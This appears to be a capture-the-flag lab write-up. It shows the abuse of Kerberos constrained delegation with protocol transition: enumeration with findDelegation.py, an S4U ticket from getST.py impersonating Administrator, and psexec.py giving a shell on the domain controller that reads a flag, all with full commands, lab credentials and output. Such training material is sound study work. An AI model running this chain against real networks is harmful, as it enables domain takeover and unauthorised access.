

### To find constrained delegations

```bash
findDelegation.py 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$'

Impacket v0.11.0 - Copyright 2023 Fortra                                                                                           │
                                                                                                                                   │
AccountName    AccountType  DelegationType                      DelegationRightsTo                                                 │
-------------  -----------  ----------------------------------  --------------------------------                                   │
callum.dixon   Person       Unconstrained                       N/A                                                                │
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL                                   │
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                                                       │
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL                                       │
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                                                           │
SQL01$         Computer     Unconstrained                       N/A                                                                │
```
We can see there are three types of delegation in the results:

-   Unconstrained: This account has unconstrained delegation
-   Constrained: This account has constrained delegation without protocol transition support
-   Constrained w/ Protocol Transition: This account has constrained delegation with protocol transition support


```bash
getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[-] CCache file is not found. Skipping... 
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

```bash
❯ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/arthur/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket
[+] StringBinding ncacn_np:DC01[\pipe\svcctl]
[+] Using Kerberos Cache: ./Administrator.ccache
[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
[+] Using TGS from cache
[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
[*] Requesting shares on DC01.....
[*] Found writable share ADMIN$
[*] Uploading file GIEdNrhf.exe
[*] Opening SVCManager on DC01.....
[*] Creating service JjlK on DC01.....
[*] Starting service JjlK.....
[+] Using Kerberos Cache: ./Administrator.ccache
[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
[+] Using TGS from cache
[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
[+] Using Kerberos Cache: ./Administrator.ccache
[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
[+] Using TGS from cache
[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
[!] Press help for extra shell commands
[+] Using Kerberos Cache: ./Administrator.ccache
[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
[+] Using TGS from cache
[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> dir C:\Users\Administrator\Desktop\flag.txt
 Volume in drive C has no label.
 Volume Serial Number is 7C54-55D0

 Directory of C:\Users\Administrator\Desktop

04/01/2023  11:25 AM                24 flag.txt
               1 File(s)             24 bytes
               0 Dir(s)   1,315,307,520 bytes free

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
Fl4g_C0nstrained_Delg 

```

###
